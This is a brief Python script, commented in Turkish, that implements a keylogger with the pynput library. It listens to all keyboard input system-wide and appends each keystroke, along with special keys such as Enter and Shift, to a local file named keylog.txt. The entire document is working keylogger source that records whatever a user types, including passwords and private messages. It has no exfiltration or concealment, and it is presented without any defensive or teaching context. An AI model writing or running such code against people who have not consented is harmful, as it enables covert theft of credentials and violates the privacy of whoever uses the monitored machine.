from pynput import keyboard
from pynput.keyboard import Key

log_file = "keylog.txt"

def on_press(key):
    try:
        #tuş basıldığında yazma işlemi
        with open(log_file, "a") as f:
            f.write(f"{key.char}")

    except AttributeError:
        #özel tuşlar(Enter, Shift, vs)

        with open(log_file, "a") as f:
            if key == Key.enter:
                f.write("\n") # entera basıldıgında yeni satıra geç
            elif key == Key.space: #Boşluk tuşuna basıldığında boşluk koy
                f.write(" ")
            elif key != Key.enter and key != Key.space:
                f.write(f"[{key}]")
            f.write("")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
